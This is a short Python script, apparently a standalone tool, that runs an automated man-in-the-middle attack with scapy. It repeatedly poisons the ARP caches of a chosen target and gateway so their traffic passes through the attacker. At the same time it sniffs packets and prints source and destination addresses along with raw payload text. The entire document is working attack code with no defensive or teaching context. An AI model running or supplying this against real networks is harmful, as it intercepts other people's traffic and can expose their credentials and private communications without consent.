
import threading
import time
from scapy.all import ARP, send, sniff, IP, TCP, Raw
import argparse

def spoof(target_ip, spoof_ip):
    packet = ARP(op=2, pdst=target_ip, psrc=spoof_ip)
    send(packet, verbose=False)

def arp_loop(target, gateway):
    while True:
        spoof(target, gateway)
        spoof(gateway, target)
        time.sleep(2)

def process_packet(packet):
    if packet.haslayer(IP):
        print(f"[IP] {packet[IP].src} -> {packet[IP].dst}")
        if packet.haslayer(Raw):
            try:
                data = packet[Raw].load.decode(errors="ignore")
                if data.strip():
                    print(f"[DATA] {data[:80]}")
            except:
                pass

def sniff_loop():
    sniff(store=False, prn=process_packet)

def main():
    parser = argparse.ArgumentParser(description="Automated MitM ARP + Sniff")
    parser.add_argument("-t", "--target", required=True)
    parser.add_argument("-g", "--gateway", required=True)
    args = parser.parse_args()

    print("[+] Starting MitM automation")

    t1 = threading.Thread(target=arp_loop, args=(args.target, args.gateway))
    t2 = threading.Thread(target=sniff_loop)

    t1.start()
    t2.start()

if __name__ == "__main__":
    main()
